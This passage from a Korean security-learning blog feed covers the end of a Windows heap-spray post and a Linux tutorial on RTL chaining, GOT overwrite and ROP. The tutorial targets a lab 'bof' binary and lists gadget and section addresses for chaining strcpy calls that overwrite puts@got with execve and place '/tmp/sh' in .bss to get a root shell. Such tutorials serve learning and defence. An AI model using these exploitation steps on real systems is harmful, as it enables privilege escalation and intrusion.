&lt;/figure&gt;

&lt;p&gt;0x80010만큼 할당되었다고 했기에 0x80000 위치쯤을 확인해보니 chunk 사이에 여전히 빈 공간이 남아있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;!heap -flt s 0x080010으로 출력되었던 주소 간의 거리를 구해서 다시 출력해보니 아래와 같이 잘 출력이 되는 것이 보이네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_15.png&quot; alt=&quot;[그림 1-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;역시나 빈 공간이 생긴다는 것은 어쩔 수 없는 것 같습니다.&lt;/p&gt;

&lt;p&gt;하지만!! 우리가 할당한 각 chunk의 크기가 워낙 크고 많기 때문에 이 정도 수치는 무시하셔도 좋습니다.&lt;/p&gt;

&lt;h6 id=&quot;예측-가능한-주소&quot;&gt;예측 가능한 주소&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d 0c0c0c0c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어로 0c0c0c0c, 0a0a0a0a 등 예측 가능한 주소를 덤프해봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_16.png&quot; alt=&quot;[그림 1-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위와 같이 NOP이 위치하는 것을 알 수 있습니다. 이는 한 번 출력되었다고 해서 사용할 수 있는 것은 아니며,&lt;/p&gt;

&lt;p&gt;반복적으로 덤프해본 후, 신뢰할만한 주소인지 확인해야 합니다.&lt;/p&gt;

&lt;p&gt;위 주소에 늘 NOP이 위치한다면 Exploit 때 신뢰할 수 있는 ShellCode의 주소로 사용할 수 있습니다.&lt;/p&gt;

&lt;p&gt;지금까지 기본적인 HeapSpray에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 글부터는 지금까지 설명한 취약점들을 종합해서 IE8, IE10, IE11 Exploit을 살펴보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0c Heap Spray</summary></entry><entry><title type="html">linux_0x04</title><link href="/linux_0x05" rel="alternate" type="text/html" title="linux_0x04" /><published>2019-05-16T11:18:00+09:00</published><updated>2019-05-16T11:18:00+09:00</updated><id>/linux_0x05</id><content type="html" xml:base="/linux_0x05">&lt;h2 id=&quot;rtl-chaining--ropreturn-oriented-programming&quot;&gt;RTL Chaining &amp;amp; ROP(Return Oriented Programming)&lt;/h2&gt;

&lt;p&gt;이번 시간부터는 지난 포스팅에서 진행된 환경보다 비교적 최신의 환경에서 진행 해보겠습니다.&lt;/p&gt;

&lt;p&gt;지금까지 알아본 Stack관련 내용은 모두 오늘 포스팅을 위해 알아본것입니다. 그럼 먼저 이번에는 &lt;strong&gt;RTL Chaining&lt;/strong&gt;에 대해 알아 보겠습니다. &lt;strong&gt;RTL Chaining&lt;/strong&gt;은 원하는 라이브러리 함수를 여러번 호출하는 기법입니다. 어떻게 여러번 호출 하느냐 전에 &lt;strong&gt;Gadget&lt;/strong&gt; 이라는 개념을 알아야 합니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Gadget&lt;/strong&gt; 의 사전 의미는 “(작고 유용한) 도구” 의미입니다만, 우리가 다루는 &lt;strong&gt;bof&lt;/strong&gt;에서의 &lt;strong&gt;Gadget&lt;/strong&gt;은 &lt;strong&gt;RET로 끝나는 연속된 함수&lt;/strong&gt;를 지칭 합니다. 대표적으로 &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;R&lt;/strong&gt;ET&lt;strong&gt;(PPR)&lt;/strong&gt;를 사용합니다.
&lt;strong&gt;PPR&lt;/strong&gt;의 용도는 “&lt;strong&gt;함수에 사용된 인자들을 정리하기 위해 사용되는 것&lt;/strong&gt;” 으로 알아두시면 됩니다.(POP의 역할을 생각해보시면 쉽습니다!)&lt;/p&gt;

&lt;p&gt;그럼 어떻게 &lt;strong&gt;PPR&lt;/strong&gt;을 사용해서 원하는 행위를 유도하는지 알아 보도록 하죠.
위에서 &lt;strong&gt;RTL&lt;/strong&gt;을 설명드릴 때 &lt;strong&gt;RET&lt;/strong&gt; 구역에 system()의 주소가 위치하고 바로 이어서 무의미한 값을 채웠습니다. 그 다음 /bin/sh 의 주소를 위치 시켰었죠. 지금은 RET구역 다음에 위치하던 무의미한 값을 채우는것이 아닌 Gadget을 위치시키도록 합니다. 이 때 RET에 위치하는 함수가 사용하는 인자의 갯수에 맞춰 PPR의 모양이 달라집니다.&lt;/p&gt;

&lt;p&gt;함수가 사용하는 인자가 &lt;strong&gt;2&lt;/strong&gt;개라면 &lt;strong&gt;PPR&lt;/strong&gt;, &lt;strong&gt;1&lt;/strong&gt;개라면 &lt;strong&gt;PR&lt;/strong&gt;, &lt;strong&gt;5&lt;/strong&gt;개라면 &lt;strong&gt;PPPPPR&lt;/strong&gt;이 됩니다. 우리는 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하며 이 친구는 &lt;strong&gt;1개의 인자를 사용&lt;/strong&gt;합니다. 따라서 &lt;strong&gt;PR&lt;/strong&gt;(POP RET)이 되겠습니다.&lt;/p&gt;

&lt;p&gt;함수가 동작 되면 POP으로 함수의 인자를 정리하고 RET에 원하는 라이브러리 함수를 위치시켜서 원하는 함수로 다시 호출하는 방식입니다. 이것을 반복하면 원하는 함수를 여러번 계속 해서 호출이 가능해 집니다. 조금 쉽게 표현 하자면 &lt;strong&gt;학교&lt;/strong&gt; 끝나고 &lt;strong&gt;집&lt;/strong&gt;에만 갔었는데(&lt;strong&gt;RTL&lt;/strong&gt;) 이제는 &lt;strong&gt;학교&lt;/strong&gt; 끝나고 &lt;strong&gt;편의점&lt;/strong&gt;도 들리고 &lt;strong&gt;PC방&lt;/strong&gt;도 들리고 &lt;strong&gt;데이트&lt;/strong&gt;도 하고나서 &lt;strong&gt;집&lt;/strong&gt;에 도착하는 행위가 가능해진 겁니다.(&lt;strong&gt;RTL Chaining&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;즉, 공격자의 입맛대로 공격 페이로드를 디잔인할 수 있는 것이죠. 그림으로 비교 해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-1.png&quot; alt=&quot;[그림 5-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위의 그림이 앞 포스팅에서 함께 봤던 일반적인 RTL입니다. execl()을 실행 시켜서 4byte 뒤에 위치시켜둔 인자를 받아내고 RET 위치위 AAAA로 이동 후 error를 발생 시키고 종료 합니다.(error 발생이 싫으신 분들은 exit() 함수를 위치 시켜주시면 종료 됩니다.) 이 작업을 여러번 chain처럼 연결 시켜 연속적으로 RTL을 사용하는  &lt;strong&gt;RTL Chaining&lt;/strong&gt;이 완성 됩니다. 다음은 &lt;strong&gt;RTL Chaining&lt;/strong&gt;을 보도록 하겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;rtl-chaining&quot;&gt;RTL Chaining&lt;/h1&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-2.png&quot; alt=&quot;[그림 5-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;쉬운 이해를 위해서 함수를 단순화 했습니다. func1()함수는 두 개의 인자를, func2()는 한 개의 인자를 사용합니다. 따라서 func1()이 끝나고 func2()로 이어기 위해선 PPR이 필요합니다.&lt;/p&gt;

&lt;p&gt;func1()이 종료되면 RET 위치에 위치한 PPR동작합니다. POP POP 작업으로 두개의 인자가 정리되고  ret가 수행되며 func2()로 넘어갑니다. func2()의 동작이 끝나고 ret가 수행될 것입니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RTL Chaining&lt;/strong&gt;은 이런식으로 ret 영역에 PPR(함수 인자수에 맞춰서)을 위치 시켜 원하는 함수를 계속적으로 추가 수행 하도록 하는 방식입니다.&lt;/p&gt;

&lt;p&gt;다음으로 &lt;strong&gt;PLT&lt;/strong&gt;와 &lt;strong&gt;GOT&lt;/strong&gt;라는것을 알아보겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;plt--got&quot;&gt;PLT &amp;amp; GOT&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;PLT&lt;/strong&gt;는 &lt;strong&gt;Procedure Linkage Table&lt;/strong&gt;의 약자로 외부 프로시저를 연결해주는 테이블 입니다. 이놈을 이용해 다른 라이브러리의 프로시저를 호출합니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GOT&lt;/strong&gt;는 &lt;strong&gt;Global Offset Table&lt;/strong&gt;의 약자로 PLT가 참조하는 테이블입니다. 프로시저들의 실제 주소가 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-3.png&quot; alt=&quot;[그림 5-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그림에서 보는 과정처럼 &lt;strong&gt;함수를 처음 호출 할 경우&lt;/strong&gt; PLT에서 GOT를 참조하며 GOT는 호출된함수의 실제 주소를 찾기위해 여러 과정을 거칩니다. 최종적으로 &lt;strong&gt;resolve&lt;/strong&gt;에서 호출 함수의 주소 리턴하며 실행 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-4.png&quot; alt=&quot;[그림 5-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 처럼 &lt;strong&gt;함수가 한 번 호출 되고 나면 GOT에 해당 함수의 주소가 저장&lt;/strong&gt; 됩니다. 그 후에 다시 해당 함수를 호출할 경우 첫 함수 호출 때 처럼 복잡한 과정은 생략되고 &lt;strong&gt;바로 GOT에 저장된 주소를 참조하여 호출&lt;/strong&gt; 됩니다.&lt;/p&gt;

&lt;p&gt;네비게이션에서 목적지의 경로를 찾기 위해서 여러 검색 과정을 거치는 과정이 함수의 첫 호출 과정이고 같은 목적지의 경로를 다시 갈 경우 복잡하게 목적지를 등록할 필요 없이 이미 저장되어있는 목적지로 바로 안내가 시작 되는 것을 함수 재호출 과정이라 생각하시면 될 것 같습니다.&lt;/p&gt;

&lt;p&gt;그런데 왜 PLT와 GOT를 알아봤을까요???&lt;/p&gt;

&lt;p&gt;공격자가 GOT에 저장된 주소를 특정 주소로 바꾼다면???GOT에서 호출되는 주소는 호출 함수의 주소가 아닌 지정된 임의의 주소로 호출이 가능하게 됩니다.&lt;/p&gt;

&lt;p&gt;[&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-5.png&quot; alt=&quot;[그림 5-5]&quot; /&gt;
&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;위 그림처럼 표현 해봤습니다. GOT Overwrite 라는 기법입니다. 그림에서 보이듯 GOT에 공격자가 원하는 함수의 주소를 저장 시켜놓고 해당 함수를 호출하여 동작하게 되는 시나리오가 그려집니다.&lt;/p&gt;

&lt;p&gt;이제는 대충 뭘 어떻게 해야할지 그림이 그려질 것이라 믿고 ROP를 진행 하겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(bof.c 의 코드는 변경 없이 그대로 진행됩니다.)&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;ropreturn-oriented-programming&quot;&gt;ROP(Return Oriented Programming)&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;buffer 크기 :&lt;/li&gt;
  &lt;li&gt;strcpy() 주소 :&lt;/li&gt;
  &lt;li&gt;execve() 주소 :&lt;/li&gt;
  &lt;li&gt;PPR 주소 :&lt;/li&gt;
  &lt;li&gt;.BSS 주소 :&lt;/li&gt;
  &lt;li&gt;puts@plt 주소 :&lt;/li&gt;
  &lt;li&gt;puts@got 주소 :&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;먼저 &lt;strong&gt;ROP&lt;/strong&gt;진행을 위해 위 내용들이 필요 합니다. 그런데 &lt;strong&gt;puts()&lt;/strong&gt;라는 처음 보는 아이가 보이네요. 저 아이는 printf() 함수와 같은 문자열 출력 역할을 합니다. 약간의 차이는 있습니다만 쉽게 생각해 printf()보다 단순화(&lt;strong&gt;한 개의 인자만 처리&lt;/strong&gt;) 및 빠른 처리가 가능한 문자열 출력 함수라 생각하시면 됩니다.
그런데 왜 puts() 저놈이 보이느냐면 상위 버전의 linux 환경에서는 한 개의 인자만 사용해서 printf()를 사용할 경우 알아서 더 효율적인 puts()함수로 사용 하게 됩니다.&lt;/p&gt;

&lt;p&gt;어찌됫건 우리는 저 puts()의 got 주소를 원하는 함수로 바꿔야 합니다.&lt;/p&gt;

&lt;p&gt;먼저 사용할 함수의 주소를 찾아보도록 하겠습니다. 전 포스트를 참고하셔서 &lt;strong&gt;execve()&lt;/strong&gt;주소를 아래처럼 찾아 주시면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-6.png&quot; alt=&quot;[그림 5-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 &lt;strong&gt;strcpy()&lt;/strong&gt;와 &lt;strong&gt;puts@plt&lt;/strong&gt;와 &lt;strong&gt;puts@got&lt;/strong&gt;도 다음과 같이 뽑아줍시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-7.png&quot; alt=&quot;[그림 5-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;다음은 리눅스 기본 툴인 &lt;strong&gt;objdump&lt;/strong&gt;를 사용하여 &lt;strong&gt;PPR 의 주소&lt;/strong&gt;를 찾아보겠습니다.
명령어는 다음중 아무거나 사용하셔도 상관 없습니다. 결과는 같습니다.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;**objdump -d bof1&lt;/td&gt;
      &lt;td&gt;grep -B 4 ret**&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;**objdump -d bof&lt;/td&gt;
      &lt;td&gt;grep “pop” -A3**&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-8.png&quot; alt=&quot;[그림 5-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;strcpy()&lt;/strong&gt;는 두 개의 인자를 사용하니 &lt;strong&gt;PPR&lt;/strong&gt;의 주소를 챙겨 둡니다. 마지막으로 Buffer 크기를 구해주도록 합시다.&lt;/p&gt;

&lt;p&gt;다음은 .bss의 주소를 찾아 보겠습니다.
.bss는 첫 포스팅에서 메모리 구조를 표현할때 나왔던 녀석입니다. 데이터 세그먼트의 한 부분이며 사용자에게 쓰기 권한이 있고 주소값이 변하지 않는 영역입니다.(&lt;strong&gt;초기화되지 않은 변수들이 저장되는 전역변수 영역&lt;/strong&gt;)
쉽게 말해 공격자에게 사랑받는 영역입니다.(&lt;strong&gt;쓰기 가능&lt;/strong&gt;/&lt;strong&gt;고정 주소&lt;/strong&gt;)
.bss는 gdb 내에서 info files 명령어를 사용하여 찾아줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-9.png&quot; alt=&quot;[그림 5-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;.bss의 시작 주소는 0x0804a020입니다만 겹침을 방지하기 위해 16byte 정도 뒤의 주소를 사용합니다. 따라서 16byte를 더한 주소값인 &lt;strong&gt;0x0804a030&lt;/strong&gt;이 되겠습니다.&lt;/p&gt;

&lt;p&gt;이제 마지막으로 Buffer의 사이즈를 확인 해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-10.png&quot; alt=&quot;[그림 5-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이전 포스팅까지는 해당 위치의 EBP+ 값으로 버퍼의 크기를 확인 가능했지만 지금은 ESP가 자리 잡고 있으며 다른 방법으로 버퍼의 크기를 구해야 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-11.png&quot; alt=&quot;[그림 5-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 버퍼의 크기가 할당된 다음인 +25 라인에 브레이크를 걸어주고 실행 시키킵니다. 그 후에 EBP에서 EAX의 값을 빼주면 해당 값이 버퍼의 크기가 됩니다. 프로그램을 run 시켜주고 브레이크에 잡혀있는 main+25의 위치에서 EBP와 EAX를 확인후 앞서 말헀듯  EBP - EAX를 해줍시다&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-12.png&quot; alt=&quot;[그림 5-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0xbf96a168 - 0xbf96a14c = 0x1c입니다. 1c는 28이며 Buffer의 크기는 28 + 4하여 32byte가 되겠습니다.&lt;/p&gt;

&lt;p&gt;그럼 지금까지 찾은 정보들을 확인해보겟습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;execve() 주소 : &lt;strong&gt;0x43814550&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;.BSS 주소 : &lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;puts@plt 주소 : &lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;puts@got 주소 : &lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/tmp/sh\x00 주소 :&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이제 필요한 정보들을 어느정도 모았습니다. 이 정보들을 활용해서 shell을 따도록 합시다.&lt;/p&gt;

&lt;p&gt;먼저 &lt;strong&gt;data&lt;/strong&gt;영역의 &lt;strong&gt;puts@got&lt;/strong&gt;에 execve() 함수의 주소를 저장해줘야 합니다. execve()의 주소는 &lt;strong&gt;0x43814550&lt;/strong&gt;이지만 그대로 저장시키면 안되며 각 주소의 4byte씩을 나눠서 저장해야 합니다. 즉 &lt;strong&gt;0x 43 81 45 50&lt;/strong&gt;이런식으로 잘라서 각각 4byte의 주소값 별도로 구해야 합니다.&lt;/p&gt;

&lt;p&gt;무슨 개똥같은 말이냐면 \x43이라는 문자열의 주소 \x81이라는 문자열의 주소와 같이 각 자리를 문자열로 취급하여 해단 문자열의 주소값을 찾아야 하는겁니다.
같은 방식으로 /tmp/sh\x00도 각각의 문자열의 주소를 찾아야 하니 참고하시면 됩니다.(‘/’, ‘t’, ‘m’, ‘p’, ‘s’, ‘h’, ‘\x00’ 과 같이 구해야 합니다……)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-13.png&quot; alt=&quot;[그림 5-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;앞에서 info files 에서 나왔던 첫 주소값부터 .bss 주소값까지를 사용하셔도 되고 /proc/self/maps의 주소값을 찾으셔도 됩니다. 주의 하실점은 위 그림처럼 나오는 주소중에 똑바로 안되는 주소도 있으며 오른쪽에 추가적인 내용이 없는 주소를 사용 하시면 됩니다.(저는 info files로 확인한 주소를 사용했습니다.)&lt;/p&gt;

&lt;p&gt;주의점은 execve()의 주소값의 주소값을 puts@got에 저장하기 위해 페이로드 작성시 기존의 리틀엔디안으로 입력했 듯 이번엔 두 번 뒤집어주면 됩니다. 리틀엔디언의 리틀엔디언으로 입력해주시면 됩니다. 쉽게말해 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값인 &lt;strong&gt;0x43814550&lt;/strong&gt;의 각 &lt;strong&gt;4byte&lt;/strong&gt; 주소값을 입력할때는 다시 역순으로 해주시면 됩니다. 50의 주소를 먼저 다음은 45 81 43 순으로 입력하는것이죠. 다시 말하지만 페이로드 작성할 때를 말씀드리는 겁니다. 계속 해서 각각의 주소값을 구하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-14.png&quot; alt=&quot;[그림 5-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;puts@got에 execve()의 주소를 저장하기 위한 준비가 끝났습니다. 실제로 해당 got 위치에 execve()의 주소가 박히는지 확인해 보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-15.png&quot; alt=&quot;[그림 5-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;우선 페이로드는 위 그림처럼 구성을 하시면 되겠습니다. 위에서 설명했던 &lt;strong&gt;Chaining&lt;/strong&gt; 을 활용해서 첫 strcpy가 끝나면 두 다음 strcpy로 넘어가고, 두 번째 수행이 끝나면 다음 함수로 쭉쭉 진행하게 됩니다. 진행하면서 puts@got[0]~[3]까지 구역에 execve() 함수의 주소값을 의미하는 문자열의 주소값이 저장됩니다. 다시 조금더 보기 편하게 각 칸에  주소값을 입력해보겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;puts@got 주소 : &lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;execve() 주소 : &lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-16.png&quot; alt=&quot;[그림 5-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;페이로드는 이렇게 구성 되겠습니다. 직접 때려보고 got에 execve()의 주소값 &lt;strong&gt;0x43814550&lt;/strong&gt;이 잘 박혀있나 확인 해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-17.png&quot; alt=&quot;[그림 5-17]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;puts@got&lt;/strong&gt;시작 주소인 [0] 주소를 까보면 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값인 &lt;strong&gt;0x43814550&lt;/strong&gt;이 잘 박혀있는것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이제 70%정도 끝났습니다. 계속해서 나머지 30% 채워서 root shell까지 함께 따보겠습니다.&lt;/p&gt;

&lt;p&gt;이번엔 .bss영역에 이전 포스팅에서 작성했던 setuid를 세팅해주는 스크립트의 경로와 마지막 null값까지 포함한 ‘/tmp/sh\x00’의 각 문자의 주소를 따보도록 하겠습니다. 주소를 따는 방법은 위에서와 동일 하지만 리틀엔디안의 리틀엔디안같은 똥같은 짓은 안하셔도 됩니다. 기존에 하던 방식처럼 리틀엔디언을 한 번만 생각해주시면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-18.png&quot; alt=&quot;[그림 5-18]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;각 문자열의 주소값은 위 그림과 같습니다. 다시 말씀드리지만 주소값 찾는 방법은 위에서 찾은 방법과 동일합니다. 다만, 제가 찾은 문자열의 주소와 다를 경우 안되는 경우도 있습니다. 이런 노가다성 작업을 하고서는 최종 페이로드 작성하고 공격했는데 실해하면 상당히 멘붕입니다. 별다른 단서가 없기에 다시 노가다 하는 방법밖에 없죠….(툴이 있긴 합니다. 편하고 편한….)
저와 같은 삽질은 없으시길 바랍니다.(연속된 삽질로 숙련된 삽퍼가 되긴 합니다. 의도하지 않은 삽질로 이것저것 이해가 되는….비추입니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-19.png&quot; alt=&quot;[그림 5-19]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;페이로드는 위와 같이 구성되며 마찬가지로 각 주소값을 입력하면 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;.BSS 주소 : &lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/tmp/sh\x00 주소 : 0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-20.png&quot; alt=&quot;[그림 5-20]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;실제 페이로드는 위와 같으며 이것도 마찬가지로 /tmp/sh\x00이 잘 박혀있나 확인 해봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-21.png&quot; alt=&quot;[그림 5-21]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;.bss의 첫 추소를 검색해보면…..나이스ㅠ…..\x00은 null로 인식되어 우리가 원하는 /tmp/sh 문자열이 잘 박혀있습니다.&lt;/p&gt;

&lt;p&gt;이제 99%입니다. 1% 채우고 개…아니 root shell 따고 종료 합시다!!!!&lt;/p&gt;

&lt;p&gt;이제 남은건 puts@plt를 호출하고 execve()의 인자값으로 “/tmp/sh”를 넘겨주면 뙇씌!!!
바로 하도록 하겠습니다. 위에서 만든 두개의 페이로드를 합쳐 주시고 제일 뒤쪽에 puts@plt 호출 및 인자 전달을 위한 .bss의 첫 주소를 박아주면 되겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-22.png&quot; alt=&quot;[그림 5-22]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;전체적인 페이로드는 이런 모습으로 구성 될 것입니다. 제일 아래쪽 &lt;strong&gt;puts@plt&lt;/strong&gt; 라인을 추가하여 &lt;strong&gt;puts@plt&lt;/strong&gt;를 호출하여 &lt;strong&gt;puts@got&lt;/strong&gt;에 저장된 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값을 호출하며 &lt;strong&gt;execve()&lt;/strong&gt;의 인자값으로 &lt;strong&gt;.bss[0]&lt;/strong&gt;의 주소를 넘겨주어 최종적으로 &lt;strong&gt;/tmp/sh&lt;/strong&gt;가 실행 되도록 하는 구성입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;puts@got 주소 : &lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;execve() 주소 : &lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;.BSS 주소 : &lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/tmp/sh\x00 주소 : 0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/li&gt;
  &lt;li&gt;puts@plt 주소 : &lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-23.png&quot; alt=&quot;[그림 5-23]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;최종 페이로드 구성입니다. 설명도 위쪽에 이미 전부 했기에 바로 떄리고 확인 해보겠슴돠!&lt;/p&gt;

&lt;p&gt;root 계정이 아닌 일반 계정으로 바꾼 후 위의 페이로드를 떄리겠습니다.&lt;/p&gt;

